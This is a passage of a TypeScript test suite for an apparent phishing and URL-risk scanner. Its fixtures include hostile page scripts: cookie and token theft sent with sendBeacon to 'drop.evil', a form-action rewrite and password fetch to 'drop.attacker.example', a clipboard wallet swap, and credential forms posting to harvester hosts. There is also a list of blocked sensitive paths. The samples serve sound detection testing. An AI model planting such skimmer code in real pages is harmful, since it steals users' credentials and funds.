    const provJson: any = JSON.parse(provRaw);
    const ids = new Set((provJson.providers || []).map((p: any) => p.id));
    assert.ok(ids.has('cloudflare_security_dns'), 'Cloudflare Security DNS should be registered');
    assert.ok(ids.has('phishstats'), 'PhishStats Public API should be registered');
    for (const rawEnvName of [
      'VIRUSTOTAL_API_KEY',
      'URLHAUS_AUTH_KEY',
      'URLSCAN_API_KEY',
      'OTX_API_KEY',
      'SCREENSHOTNEO_ACCESS_KEY',
    ]) {
      assert.ok(!provRaw.includes(rawEnvName), `Providers API must not leak raw env var name ${rawEnvName}`);
    }

    // Sensitive paths & dotfiles & backups & traversal MUST be rejected
    for (const blockedPath of [
      '/.env',
      '/.git/config',
      '/server.ts',
      '/package.json',
      '/backup.sql',
      '/database.sqlite',
      '/server/scanManager.ts',
      '/..%2f.env',
    ]) {
      const r = await fetch(`${base}${blockedPath}`);
      assert.ok(
        r.status === 400 || r.status === 403,
        `Expected 400/403 for ${blockedPath}, got ${r.status}`
      );
    }

    // Real HTTP status codes on error pages & unknown pages (never 200!)
    const err404Unknown = await fetch(`${base}/definitely-missing-page-xyz`);
    assert.equal(err404Unknown.status, 404, 'Unknown path must return real HTTP 404');

    const err403Preview = await fetch(`${base}/error/403`);
    assert.equal(err403Preview.status, 403);

    const err500Preview = await fetch(`${base}/error/500`);
    assert.equal(err500Preview.status, 500);

    // SEO robots.txt & sitemap.xml
    const robots = await fetch(`${base}/robots.txt`);
    assert.equal(robots.status, 200);
    const robotsText = await robots.text();
    assert.ok(robotsText.includes('Disallow: /api/'));
    assert.ok(robotsText.includes('Disallow: /history'));
    assert.ok(robotsText.includes('Sitemap:'));

    const sitemap = await fetch(`${base}/sitemap.xml`);
    assert.equal(sitemap.status, 200);
    const sitemapText = await sitemap.text();
    assert.ok(sitemapText.includes('<urlset'));
    assert.ok(sitemapText.includes('/about'));
    assert.ok(sitemapText.includes('/privacy'));

    // Malformed / invalid scan payload rejections
    const badContentType = await fetch(`${base}/api/scans`, {
      method: 'POST',
      headers: { 'Content-Type': 'text/plain' },
      body: 'https://example.com',
    });
    assert.equal(badContentType.status, 415);

    const badJson = await fetch(`${base}/api/scans`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ url: '' }),
    });
    assert.equal(badJson.status, 400);
  } finally {
    await new Promise<void>((resolve, reject) => srv.close((err) => (err ? reject(err) : resolve())));
  }
});

// 26. Vite Dev Mode Module & Pre-Bundled Deps Regression Test (prevents white screen from dotfile shield)
test('26. Vite dev server serves index, /src/main.tsx, and /node_modules/.vite/deps/* while still blocking secrets', async () => {
  const app = await createApp({ enableVite: true, viteHmr: false });
  const srv = http.createServer(app);
  await new Promise<void>((resolve) => srv.listen(0, '127.0.0.1', resolve));
  const addr = srv.address() as { port: number };
  const base = `http://127.0.0.1:${addr.port}`;

  try {
    const home = await fetch(`${base}/`);
    assert.equal(home.status, 200);
    const homeHtml = await home.text();
    assert.ok(homeHtml.includes('/src/main.tsx'));

    const mainTsx = await fetch(`${base}/src/main.tsx`);
    assert.equal(mainTsx.status, 200);
    const mainCode = await mainTsx.text();

    // Extract actual Vite pre-bundled dep path (e.g. /node_modules/.vite/deps/react-dom_client.js?v=...)
    const depMatch = mainCode.match(/\/node_modules\/\.vite\/deps\/[^"'\s]+/);
    assert.ok(depMatch, 'Expected transformed /src/main.tsx to reference /node_modules/.vite/deps/...');

    const depRes = await fetch(`${base}${depMatch[0]}`);
    assert.equal(depRes.status, 200, `Vite pre-bundled dep ${depMatch[0]} must return 200, not 403`);

    const dotEnvRes = await fetch(`${base}/.env`);
    assert.equal(dotEnvRes.status, 403);

    const sneakyDotEnvRes = await fetch(`${base}/node_modules/.vite/deps/.env`);
    assert.equal(sneakyDotEnvRes.status, 403);
  } finally {
    await new Promise<void>((resolve, reject) => srv.close((err) => (err ? reject(err) : resolve())));
    await app.locals.viteServer?.close?.();
  }
});

// 27. Expanded Verified Official Domain Registry Scale, Cross-Sector Coverage & PaaS Isolation
test('27. Expanded Official Domain Registry verifies 400+ official domains while isolating PaaS user hosts', () => {
  const stats = getOfficialRegistryStats();
  assert.ok(stats.officialDomainCount >= 400, `Expected >=400 official domains, got ${stats.officialDomainCount}`);
  assert.ok(stats.entityCount >= 35, `Expected >=35 official entities, got ${stats.entityCount}`);
  assert.ok(stats.authorizedProviderCount >= 11, `Expected >=11 authorized third-party providers`);

  const verifiedSamples = [
    'openai.com',
    'chatgpt.com',
    'claude.ai',
    'huggingface.co',
    'vercel.com',
    'gitlab.com',
    'docker.com',
    'pypi.org',
    'alrajhibank.com.sa',
    'riyadbank.com',
    'alinma.com',
    'emiratesnbd.com',
    'nbe.com.eg',
    'instapay.eg',
    'stc.com.sa',
    'nafath.sa',
    'zatca.gov.sa',
    'digital.gov.eg',
    'u.ae',
    'gov.uk',
    'nasa.gov',
    'virustotal.com',
    'letsencrypt.org',
    'binance.com',
    'kraken.com',
    'etherscan.io',
    'saudia.com',
    'emirates.com',
    'aljazeera.net',
    'mit.edu',
    'ksu.edu.sa',
  ];

  for (const host of verifiedSamples) {
    const own = lookupDomainOwnership(host);
    assert.equal(own.matched, true, `Expected ${host} to be verified in Official Domain Registry`);
    assert.equal(own.isUserContentPaas, false, `Expected ${host} NOT to be marked as user-content PaaS`);
  }

  // Multi-tenant PaaS / user-hosted domains must NEVER verify as official corporate domains
  const paasHosts = [
    'phishing-demo.hf.space',
    'fake-login.vercel.app',
    'untrusted-app.up.railway.app',
    'custom-site.gitlab.io',
    'example-blog.wordpress.com',
    'attacker-test.web.app',
  ];
  for (const host of paasHosts) {
    const own = lookupDomainOwnership(host);
    assert.equal(own.matched, false, `PaaS user host ${host} must NOT verify as an official corporate portal`);
    assert.equal(own.isUserContentPaas, true, `PaaS user host ${host} must flag isUserContentPaas=true`);
  }

  // Parent/product relationships and SSO integrations
  assert.equal(classifyDomainRelationship('openai.com', 'chatgpt.com').isSameOrganization, true);
  assert.equal(classifyDomainRelationship('anthropic.com', 'claude.ai').isSameOrganization, true);
  assert.equal(classifyDomainRelationship('unrelated-app.example', 'nafath.sa').relationship, 'external_integration');
  assert.equal(classifyDomainRelationship('unrelated-app.example', 'js.hcaptcha.com').relationship, 'authorized_third_party_provider');
});

// 28. Clean educational page hosted on sites.google.com must NOT trigger HIGH/CRITICAL false positive
test('28. Benign educational page on sites.google.com does not classify HIGH or CRITICAL', () => {
  const url = 'https://sites.google.com/view/university-physics-lectures';
  const html = Buffer.from(
    `<!doctype html><html><head><title>University Physics Lectures</title></head>
     <body><h1>Physics 101 Course Syllabus</h1><p>Weekly mechanics notes, PDF syllabus, and office hours schedule.</p>
     <a href="https://drive.google.com/file/d/example">Course Slides</a></body></html>`,
    'utf8'
  );
  const urlRes = analyzeUrlIntelligence(url, url);
  const deceptionRes = analyzeDomainDeceptionAndIdentity({
    submittedUrl: url,
    finalUrl: url,
    redirects: [{ step: 1, url, hostname: 'sites.google.com', protocol: 'https:', statusCode: 200, crossDomain: false, downgradedToHttp: false, latencyMs: 15 }],
    htmlBuffer: html,
    contentType: 'text/html',
  });
  const contentRes = analyzeWebsiteContentAndBrand(url, 200, { 'content-type': 'text/html' }, html, urlRes.suspiciousPathTokens);
  const sourceRes = analyzeSourceIntelligence(url, { 'content-type': 'text/html' }, html);

  const scored = computeRiskAndSections(
    [...urlRes.findings, ...deceptionRes.findings, ...contentRes.findings, ...sourceRes.findings],
    mockCleanProviders(),
    { finalUrl: url }
  );

  assert.ok(
    scored.classification === 'NO_KNOWN_THREATS' || scored.classification === 'LOW',
    `Expected clean sites.google.com page to be NO_KNOWN_THREATS or LOW, got ${scored.classification} (${scored.riskScore})`
  );
  assert.ok(scored.riskScore <= 15);
});

// 29. Genuine phishing page hosted on sites.google.com classifies HIGH or CRITICAL
test('29. Phishing page hosted on sites.google.com with lure and unwrapped credential harvest classifies HIGH/CRITICAL', () => {
  const url = 'https://sites.google.com/view/verify-account-now/login';
  const html = Buffer.from(
    `<!doctype html><html><head><title>Account Verification</title></head>
     <body><h2>Urgent Security Alert: Verify your password immediately or your account will be suspended!</h2>
     <div><input type="email" name="email" /><input type="password" name="pw" /></div></body></html>`,
    'utf8'
  );
  const urlRes = analyzeUrlIntelligence(url, url);
  const contentRes = analyzeWebsiteContentAndBrand(url, 200, { 'content-type': 'text/html' }, html, urlRes.suspiciousPathTokens);
  const scored = computeRiskAndSections([...urlRes.findings, ...contentRes.findings], mockCleanProviders(), { finalUrl: url });

  assert.ok(
    scored.classification === 'HIGH' || scored.classification === 'CRITICAL',
    `Expected HIGH or CRITICAL for phishing on sites.google.com, got ${scored.classification} (${scored.riskScore})`
  );
});

// 30. Multi-hop HTTP 301/302 redirect on legitimate site is not classified malicious alone
test('30. Benign HTTP 301/302 redirect hops alone never trigger MEDIUM/HIGH/CRITICAL', () => {
  const url = 'https://www.example-retailer.org/';
  const hops: RedirectHop[] = [
    { step: 1, url: 'http://example-retailer.org/', hostname: 'example-retailer.org', protocol: 'http:', statusCode: 301, locationHeader: 'https://www.example-retailer.org/', crossDomain: false, isSameOrganization: true, downgradedToHttp: false, latencyMs: 12, redirectType: 'http_3xx' },
    { step: 2, url, hostname: 'www.example-retailer.org', protocol: 'https:', statusCode: 200, crossDomain: false, isSameOrganization: true, downgradedToHttp: false, latencyMs: 18, redirectType: 'initial' },
  ];
  const deceptionRes = analyzeDomainDeceptionAndIdentity({ submittedUrl: 'http://example-retailer.org/', finalUrl: url, redirects: hops });
  const scored = computeRiskAndSections(deceptionRes.findings, mockCleanProviders(), { redirects: hops, finalUrl: url });
  assert.equal(scored.classification, 'NO_KNOWN_THREATS');
  assert.equal(scored.riskScore, 0);
});

// 31. Valid HTTPS shared wildcard SAN hosting phishing content discloses conflict & remains HIGH/CRITICAL
test('31. Valid HTTPS certificate with shared wildcard SAN hosting phishing page remains HIGH/CRITICAL', () => {
  const url = 'https://update-portal-check.web.app/signin';
  const html = Buffer.from(
    `<html><head><title>Critical Update Required</title></head><body>
     <p>Fake browser update alert: confirm your password immediately!</p>
     <div><input type="password" name="pwd" /></div></body></html>`,
    'utf8'
  );
  const urlRes = analyzeUrlIntelligence(url, url);
  const contentRes = analyzeWebsiteContentAndBrand(url, 200, { 'content-type': 'text/html' }, html, urlRes.suspiciousPathTokens);
  const scored = computeRiskAndSections([...urlRes.findings, ...contentRes.findings], mockCleanProviders(), {
    tlsData: {
      httpsAvailable: true,
      authorized: true,
      sanList: ['*.web.app', 'web.app'],
      isSharedMultiTenantCert: true,
      sharedWildcardSanNote: 'Shared wildcard SAN belongs to hosting platform, not individual page trust.',
      domainMatches: true,
      expired: false,
    },
    finalUrl: url,
  });
  assert.ok(scored.classification === 'HIGH' || scored.classification === 'CRITICAL');
  assert.ok((scored.conflictNotes?.length || 0) >= 1);
});

// 32. Legitimate normal login <form> & modern SPA password field without false HIGH/CRITICAL accusation
test('32. Normal same-origin login form and clean SPA password input do not trigger false HIGH/CRITICAL verdict', () => {
  const url = 'https://portal.company-app.example/login';
  const html = Buffer.from(
    `<!doctype html><html><head><title>Member Portal Sign In</title></head><body>
     <form action="/api/auth/login" method="POST">
       <label>Email</label><input type="email" name="email" />
       <label>Password</label><input type="password" name="password" />
       <button type="submit">Sign In</button>
     </form>
     </body></html>`,
    'utf8'
  );
  const urlRes = analyzeUrlIntelligence(url, url);
  const contentRes = analyzeWebsiteContentAndBrand(url, 200, { 'content-type': 'text/html' }, html, urlRes.suspiciousPathTokens);
  const sourceRes = analyzeSourceIntelligence(url, { 'content-type': 'text/html' }, html);
  const scored = computeRiskAndSections([...urlRes.findings, ...contentRes.findings, ...sourceRes.findings], mockCleanProviders(), { finalUrl: url });

  assert.notEqual(scored.classification, 'HIGH');
  assert.notEqual(scored.classification, 'CRITICAL');
  assert.ok(scored.riskScore < 30, `Normal login form should stay below 30, got ${scored.riskScore}`);

  // SPA login input without form action and zero phishing lures
  const spaHtml = Buffer.from(
    `<!doctype html><html><head><title>App Login</title></head><body>
     <div id="root"><input type="email" /><input type="password" /><button>Continue</button></div>
     </body></html>`,
    'utf8'
  );
  const spaContent = analyzeWebsiteContentAndBrand(url, 200, { 'content-type': 'text/html' }, spaHtml, []);
  const spaSource = analyzeSourceIntelligence(url, { 'content-type': 'text/html' }, spaHtml);
  const spaScored = computeRiskAndSections([...spaContent.findings, ...spaSource.findings], mockCleanProviders(), { finalUrl: url });
  assert.notEqual(spaScored.classification, 'HIGH');
  assert.notEqual(spaScored.classification, 'CRITICAL');
});

// 33. Benign minified JS bundle vs malicious obfuscated eval(atob(...)) + cookie/form exfiltration
test('33. Distinguishes benign minified JS bundle from malicious eval/atob obfuscation and form hooks', () => {
  const url = 'https://bundle-test.example/';
  const benignMinified = 'a'.repeat(500);
  const benignHtml = Buffer.from(
    `<html><head><title>App</title><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/app.css" /></head>
     <body><script src="/assets/vendor.min.js"></script><script>var _x="${benignMinified}";</script><p>Docs</p></body></html>`,
    'utf8'
  );
  const benignRes = analyzeSourceIntelligence(url, { 'content-type': 'text/html' }, benignHtml);
  assert.equal(benignRes.sourceIntel.isMinifiedBundlePresent, true);
  assert.equal(benignRes.sourceIntel.suspiciousCodeSignals.length, 0);

  const maliciousHtml = Buffer.from(
    `<html><head><title>Security Check</title><style>@import url("https://evil-css.example/tracker.css");</style></head>
     <body><script>
       var _0xabc123 = ['cookie','fetch'];
       var d = document.cookie + localStorage.getItem('token');
       eval(atob('YWxlcnQoMSk='));
       document.querySelector('form').addEventListener('submit', function(){ navigator.sendBeacon('https://drop.evil/log', d); });
     </script></body></html>`,
    'utf8'
  );
  const malRes = analyzeSourceIntelligence(url, { 'content-type': 'text/html' }, maliciousHtml);
  assert.ok(malRes.sourceIntel.suspiciousCodeSignals.length >= 2);
  assert.ok((malRes.sourceIntel.storageAndCookieAccess?.length || 0) >= 2);
  assert.ok((malRes.sourceIntel.formExfiltrationHooks?.length || 0) >= 1);
  assert.ok((malRes.sourceIntel.cssExternalDomains || []).includes('evil-css.example'));
});

// 34. Title vs body contradiction & cross-origin credential submission form
test('34. Detects title-vs-body brand contradiction and external cross-origin credential form', () => {
  const url = 'https://daily-news-blog.example/post';
  const html = Buffer.from(
    `<html><head><title>Microsoft Account Sign In Security Center</title></head><body>
     <p>Welcome to our homemade pasta recipes and Italian cooking tips blog for beginners.</p>
     <form action="https://external-harvester.example/collect" method="POST">
       <input type="email" name="user" /><input type="password" name="pw" />
     </form>
     </body></html>`,
    'utf8'
  );
  const content = analyzeWebsiteContentAndBrand(url, 200, { 'content-type': 'text/html' }, html, []);
  const source = analyzeSourceIntelligence(url, { 'content-type': 'text/html' }, html);
  assert.equal(source.sourceIntel.titleContentMismatch, true);
  assert.equal(content.data?.crossOriginFormActions[0], 'https://external-harvester.example/collect');
  assert.equal(content.findings.find((f) => f.id === 'phishing-credential-harvesting')?.status, 'failed');
});

// 35. Single weak indicator never triggers CRITICAL; young domain alone stays measured
test('35. Young domain and single weak indicator never escalate to CRITICAL', () => {
  const youngFinding: CheckFinding = {
    id: 'domain-age',
    section: 'domain_intelligence',
    test: { en: 'Domain Age', ar: 'عمر النطاق' },
    result: { en: 'Registered 12 days ago', ar: 'مسجل منذ 12 يوماً' },
    status: 'failed',
    severity: 'medium',
    weight: 18,
    evidence: 'AgeDays=12',
    explanation: { en: 'Newly registered domain.', ar: 'نطاق حديث التسجيل.' },
    recommendedAction: { en: 'Verify owner.', ar: 'تحقق من المالك.' },
    source: 'RDAP',
    timestamp: new Date().toISOString(),
    confidence: 90,
  };
  const weakNote: CheckFinding = {
    id: 'minor-note',
    section: 'url_intelligence',
    test: { en: 'Minor Note', ar: 'ملاحظة' },
    result: { en: 'Long path', ar: 'مسار طويل' },
    status: 'warning',
    severity: 'low',
    weight: 4,
    evidence: 'len=95',
    explanation: { en: 'Minor.', ar: 'طفيفة.' },
    recommendedAction: { en: 'None.', ar: 'لا شيء.' },
    source: 'URL',
    timestamp: new Date().toISOString(),
    confidence: 80,
  };
  const scored = computeRiskAndSections([youngFinding, weakNote], mockCleanProviders());
  assert.notEqual(scored.classification, 'CRITICAL');
  assert.notEqual(scored.classification, 'HIGH');
  assert.ok((scored.scoreBreakdown || []).length >= 2);
  assert.ok(scored.evidenceBuckets.confirmed.length >= 1);
  assert.ok(scored.inspectionCoveragePercent > 0);
});

// 36. Default HTML served is White Light theme and English without hardcoded dark class
test('36. Server renders index.html with white light theme and English default (no dark class on html)', async () => {
  const app = await createApp({ enableVite: true, viteHmr: false });
  const srv = http.createServer(app);
  await new Promise<void>((resolve) => srv.listen(0, '127.0.0.1', resolve));
  const addr = srv.address() as { port: number };
  const base = `http://127.0.0.1:${addr.port}`;
  try {
    const res = await fetch(`${base}/`);
    assert.equal(res.status, 200);
    const html = await res.text();
    assert.ok(html.includes('<html lang="en">'), 'Default HTML must not force class="dark"');
    assert.ok(html.includes('content="#FFFFFF"'), 'Default theme-color must be pure white #FFFFFF');
    assert.ok(html.includes('scanlink_theme') && html.includes('scanlink_lang'), 'Cookie/localStorage persistence keys present');
  } finally {
    await new Promise<void>((resolve, reject) => srv.close((err) => (err ? reject(err) : resolve())));
    await app.locals.viteServer?.close?.();
  }
});

// 37. Advisory warnings (domain-age & OTX 1-pulse) stay 0-risk; MEDIUM strictly requires score > 50
test('37. Domain-age & OTX single-pulse warnings never raise risk; MEDIUM triggers strictly at score > 50', () => {
  const advisoryDomainAge: CheckFinding = {
    id: 'domain-age',
    section: 'domain_intelligence',
    test: { en: 'Domain Registration Age (RDAP / WHOIS)', ar: 'عمر تسجيل النطاق (RDAP / WHOIS)' },
    result: { en: 'Domain registered 2667 days ago', ar: 'عمر النطاق الأم 2667 يوماً (7.3 سنة) — لا يعكس عمر الصفحة المنشورة' },
    status: 'warning',
    severity: 'informational',
    weight: 0,
    evidence: 'AgeDays=2667',
    explanation: { en: 'Advisory context only.', ar: 'ملاحظة معلوماتية فقط.' },
    recommendedAction: { en: 'None.', ar: 'لا يوجد.' },
    source: 'RDAP',
    timestamp: new Date().toISOString(),
    confidence: 95,
  };
  const cleanWithOtx1 = [
    ...mockCleanProviders(),
    {
      providerId: 'otx' as const,
      providerName: 'AlienVault OTX',
      category: 'Threat Pulses',
      enabled: true,
      configured: true,
      operationalState: 'active' as const,
      status: 'clean' as const,
      matchScope: 'none' as const,
      verdictDetail: {
        en: 'Advisory OTX note: Domain=1, IP=0 (below threshold, 0 risk).',
        ar: 'نبضات التهديد في OTX: النطاق=1، IP=0 (تنبيه غير مُصنِّف بدون تأثير على الخطورة).',
      },
      requiresKey: true,
    },
  ];
  const zeroRisk = computeRiskAndSections([advisoryDomainAge], cleanWithOtx1, { finalUrl: 'https://clean-site.example/' });
  assert.equal(zeroRisk.riskScore, 0);
  assert.equal(zeroRisk.classification, 'NO_KNOWN_THREATS');

  // Findings summing <= 50 must remain LOW (never MEDIUM)
  const makeCheck = (id: string, weight: number, status: 'failed' | 'warning' = 'warning'): CheckFinding => ({
    id,
    section: 'website_content',
    test: { en: id, ar: id },
    result: { en: id, ar: id },
    status,
    severity: status === 'failed' ? 'medium' : 'low',
    weight,
    evidence: id,
    explanation: { en: id, ar: id },
    recommendedAction: { en: id, ar: id },
    source: 'Test',
    timestamp: new Date().toISOString(),
    confidence: 80,
  });

  const under50 = computeRiskAndSections([makeCheck('w1', 24, 'failed'), makeCheck('w2', 20, 'failed')], mockCleanProviders());
  assert.ok(under50.riskScore <= 50, `Expected <= 50, got ${under50.riskScore}`);
  assert.equal(under50.classification, 'LOW');

  // Score > 50 (e.g. 54) must trigger MEDIUM
  const over50 = computeRiskAndSections([makeCheck('m1', 28, 'failed'), makeCheck('m2', 26, 'failed')], mockCleanProviders());
  assert.ok(over50.riskScore > 50, `Expected > 50, got ${over50.riskScore}`);
  assert.equal(over50.classification, 'MEDIUM');
});

// 38. Deep static HTML/JS forensics & subdomain extraction detect real script attacks
test('38. Source analyzer catches JS form-action rewrite, password hooks, wallet drainer, overlay iframes, and subdomains', () => {
  const url = 'https://portal.mybank-site.example/';
  const html = Buffer.from(
    `<!doctype html><html><head><title>Portal</title></head><body>
     <a href="https://auth.mybank-site.example/signin">Sign in</a>
     <script src="https://cdn.mybank-site.example/vendor.js"></script>
     <form action="/login" method="POST"><input type="password" name="pw" /></form>
     <iframe src="https://frame.evil/overlay" style="opacity:0;width:100%"></iframe>
     <script>
       var f = document.querySelector('form');
       f.action = 'https://drop.attacker.example/collect';
       var p = document.querySelector('input[type="password"]').value;
       fetch('https://drop.attacker.example/log', { method: 'POST', body: p });
       navigator.clipboard.writeText('0x71C7656EC7ab88b098defB751B7401B5f6d8976F');
       setInterval(() => { debugger; }, 200);
     </script></body></html>`,
    'utf8'
  );
  const res = analyzeSourceIntelligence(url, { 'content-type': 'text/html' }, html);
  const jsSummary = res.sourceIntel.jsBehaviorSummary;
  assert.ok(jsSummary);
  assert.equal(jsSummary.dynamicFormActionRewrite, true);
  assert.equal(jsSummary.passwordFieldDomHooks, true);
  assert.equal(jsSummary.walletDrainerPattern, true);
  assert.equal(jsSummary.antiDebugTraps, true);
  assert.ok(jsSummary.hiddenOverlayIframes >= 1);

  const jsFinding = res.findings.find((f) => f.id === 'source-js-behavior');
  assert.equal(jsFinding?.status, 'failed');

  const subs = res.sourceIntel.discoveredSubdomains || [];
  assert.ok(subs.some((s) => s.host === 'auth.mybank-site.example' && s.role === 'auth' && s.suspiciousRole === true));
  assert.ok(subs.some((s) => s.host === 'cdn.mybank-site.example' && s.role === 'cdn_static'));
});

// 39. Official verified host with advisory domain-age & 1-pulse OTX classifies OFFICIAL_DOMAIN_VERIFIED at 0 risk
test('39. Official domain with advisory domain-age and clean telemetry stays OFFICIAL_DOMAIN_VERIFIED at riskScore 0', () => {
  const url = 'https://www.google.com/';
  const advisoryAge: CheckFinding = {
    id: 'domain-age',
    section: 'domain_intelligence',
    test: { en: 'Domain Registration Age', ar: 'عمر النطاق' },
    result: { en: '9000d registered', ar: '9000 يوماً' },
    status: 'warning',
    severity: 'informational',
    weight: 0,
    evidence: 'AgeDays=9000',
    explanation: { en: 'Advisory only.', ar: 'تحذير إرشادي فقط.' },
    recommendedAction: { en: 'None.', ar: 'لا يوجد.' },
    source: 'RDAP',
    timestamp: new Date().toISOString(),
    confidence: 95,
  };
  const domainAuth = assessDomainAuthenticity({
    hostname: 'www.google.com',
    dnsResolved: true,
    tlsAuthorized: true,
    tlsDomainMatches: true,
  });
  const scored = computeRiskAndSections([advisoryAge], mockCleanProviders(), {
    finalUrl: url,
    domainAuthenticity: domainAuth,
    tlsData: { httpsAvailable: true, authorized: true, sanList: ['www.google.com'], domainMatches: true, expired: false },
  });
  assert.equal(scored.riskScore, 0);
  assert.equal(scored.classification, 'OFFICIAL_DOMAIN_VERIFIED');
});

// 40. Benign educational site & legitimate OAuth login widget never misclassified as brand impersonation
test('40. Benign educational site and normal login with Sign-in-with-Google OAuth button stay safe without impersonation false positive', () => {
  const eduUrl = 'https://cs.mit.edu/courses/algorithms';
  const eduHtml = Buffer.from(
    `<!doctype html><html><head><title>MIT Algorithms Lecture Notes</title>
     <meta name="description" content="Undergraduate computer science algorithms syllabus and homework." /></head>
     <body><h1>Introduction to Algorithms</h1><p>Weekly problem sets and lecture slides.</p>
     <a href="/syllabus">Syllabus</a><button>Download PDF</button></body></html>`,
    'utf8'
  );
  const eduContent = analyzeWebsiteContentAndBrand(eduUrl, 200, { 'content-type': 'text/html' }, eduHtml, []);
  const eduSource = analyzeSourceIntelligence(eduUrl, { 'content-type': 'text/html' }, eduHtml);
  const eduAuth = assessDomainAuthenticity({ hostname: 'cs.mit.edu', dnsResolved: true, tlsAuthorized: true, tlsDomainMatches: true });
  const eduScored = computeRiskAndSections([...eduContent.findings, ...eduSource.findings], mockCleanProviders(), {
    finalUrl: eduUrl,
    domainAuthenticity: eduAuth,
    tlsData: { httpsAvailable: true, authorized: true, sanList: ['*.mit.edu'], domainMatches: true, expired: false },
  });
  assert.equal(eduContent.data?.contentReadStatus, 'full');
  assert.ok(eduContent.data?.claimedPurpose?.en.length);
  assert.equal(eduScored.classification, 'OFFICIAL_DOMAIN_VERIFIED');
  assert.equal(eduScored.riskScore, 0);

  // Legitimate app login with standard "Sign in with Google" OAuth button
  const appUrl = 'https://workspace-notes.example/signin';
  const appHtml = Buffer.from(
    `<!doctype html><html><head><title>Workspace Notes — Sign In</title></head><body>
     <h1>Sign in to Workspace Notes</h1>
     <form action="/auth/login" method="POST">
       <input type="email" name="email" /><input type="password" name="password" />
       <button type="submit">Log In</button>
     </form>
     <a href="https://accounts.google.com/o/oauth2/v2/auth?client_id=123">Sign in with Google</a>
     <button type="button">Continue with Microsoft</button>
     </body></html>`,
    'utf8'
  );
  const appContent = analyzeWebsiteContentAndBrand(appUrl, 200, { 'content-type': 'text/html' }, appHtml, []);
  const appSource = analyzeSourceIntelligence(appUrl, { 'content-type': 'text/html' }, appHtml);
  const appScored = computeRiskAndSections([...appContent.findings, ...appSource.findings], mockCleanProviders(), { finalUrl: appUrl });
  assert.ok((appContent.data?.oauthWidgetsDetected || []).some((w) => /google/i.test(w)));
  assert.equal(appContent.data?.suspectedBrand, undefined, 'OAuth buttons alone must NOT flag suspectedBrand');
  assert.notEqual(appScored.classification, 'HIGH');
  assert.notEqual(appScored.classification, 'CRITICAL');
  assert.ok(appScored.riskScore < 30, `Legitimate OAuth login should stay <30, got ${appScored.riskScore}`);
});

// 41. Domain name similarity alone remains similarityOnly (never proven impersonation), while true Google-impersonating phish classifies HIGH/CRITICAL
test('41. Distinguishes domain similarity alone from active Google-impersonating phishing', () => {
  const simUrl = 'https://paypa1-support-help.example/about';
  const simHtml = Buffer.from(
    `<!doctype html><html><head><title>Independent Financial Literacy Blog</title></head>
     <body><h1>Independent Budget Planning Guides</h1><p>Articles on saving tips, spreadsheets, and personal budgeting.</p></body></html>`,
    'utf8'
  );
  const simContent = analyzeWebsiteContentAndBrand(simUrl, 200, { 'content-type': 'text/html' }, simHtml, []);
  assert.equal(simContent.data?.suspectedBrand?.similarityOnly, true);
  const simScored = computeRiskAndSections(simContent.findings, mockCleanProviders(), { finalUrl: simUrl });
  assert.notEqual(simScored.classification, 'CRITICAL');
  assert.notEqual(simScored.classification, 'HIGH');

  // Active Google impersonation phish on unrelated host
  const googlePhishUrl = 'https://accounts-google-verify-session.example/signin';
  const googlePhishHtml = Buffer.from(
    `<!doctype html><html><head><title>Sign in - Google Accounts</title></head><body>
     <img src="/logo.png" alt="Google Workspace Security" />
     <h1>Google Account Security Alert: Confirm your password immediately to prevent suspension</h1>
     <form action="https://harvester.evil/steal" method="POST">
       <input type="email" name="email" /><input type="password" name="Passwd" />
       <button type="submit">Verify Google Account</button>
     </form>
     <script>eval(atob('Y29uc29sZS5sb2coMSk='));</script>
     </body></html>`,
    'utf8'
  );
  const phishUrlRes = analyzeUrlIntelligence(googlePhishUrl, googlePhishUrl);
  const phishDeception = analyzeDomainDeceptionAndIdentity({
    submittedUrl: googlePhishUrl,
    finalUrl: googlePhishUrl,
    redirects: [{ step: 1, url: googlePhishUrl, hostname: 'accounts-google-verify-session.example', protocol: 'https:', statusCode: 200, crossDomain: false, downgradedToHttp: false, latencyMs: 10 }],
    htmlBuffer: googlePhishHtml,
    contentType: 'text/html',
  });
  const phishContent = analyzeWebsiteContentAndBrand(
    googlePhishUrl,
    200,
    { 'content-type': 'text/html' },
    googlePhishHtml,
    phishUrlRes.suspiciousPathTokens
  );
  const phishSource = analyzeSourceIntelligence(googlePhishUrl, { 'content-type': 'text/html' }, googlePhishHtml);
  const phishScored = computeRiskAndSections(
    [...phishUrlRes.findings, ...phishDeception.findings, ...phishContent.findings, ...phishSource.findings],
    mockCleanProviders(),
    { finalUrl: googlePhishUrl }
  );
  assert.ok(phishScored.classification === 'HIGH' || phishScored.classification === 'CRITICAL', `Got ${phishScored.classification} (${phishScored.riskScore})`);
  // Cross-module deduplication prevents double-counting overlapping brand/form/JS modules
  assert.ok(
    (phishScored.scoreBreakdown || []).some((b) => b.id.startsWith('dedup-')),
    'Expected cross-module deduplication entry in scoreBreakdown'
  );
});

// 42. Site blocking automated content inspection (WAF / HTTP 403) reports UNKNOWN cleanly without guessing
test('42. WAF/HTTP 403 blocked site sets blocked_by_site status and classifies UNKNOWN without fabricated claims', () => {
  const blockedUrl = 'https://protected-portal.example/';
  const cfChallengeHtml = Buffer.from(
    `<!doctype html><html><head><title>Just a moment...</title></head>
     <body><h1>Attention Required! | Cloudflare</h1><p>Checking if the site connection is secure (cf-browser-verification).</p></body></html>`,
    'utf8'
  );
  const content = analyzeWebsiteContentAndBrand(blockedUrl, 403, { 'content-type': 'text/html' }, cfChallengeHtml, []);
  assert.equal(content.data?.contentReadStatus, 'blocked_by_site');
  assert.ok(content.data?.blockedReason);
  const unavailableFinding = content.findings.find((f) => f.id === 'content-unavailable');
  assert.equal(unavailableFinding?.status, 'unknown');

  const scored = computeRiskAndSections(content.findings, mockCleanProviders(), { finalUrl: blockedUrl });
  assert.equal(scored.classification, 'UNKNOWN');
});

// 43. Dynamic JS post-load DOM mutation, external fetched JS inspection, outbound brand-lookalike links & fake support lures
test('43. Detects post-load JS DOM mutation, external JS assets, outbound brand lookalike links, and fake tech support alerts', () => {
  const url = 'https://promo-alert.example/wait';
  const html = Buffer.from(
    `<!doctype html><html><head><title>Please Wait</title></head><body>
     <div id="root"></div>
     <p>Checking your browser... You will be redirected in 5 seconds.</p>
     <p>URGENT Microsoft Windows Defender Virus Alert: Call Toll Free Tech Support immediately, your PC is infected!</p>
     <a href="https://paypa1-secure-login.example/auth">Continue Verification</a>
     <script src="https://promo-alert.example/assets/loader.js"></script>
     </body></html>`,
    'utf8'
  );
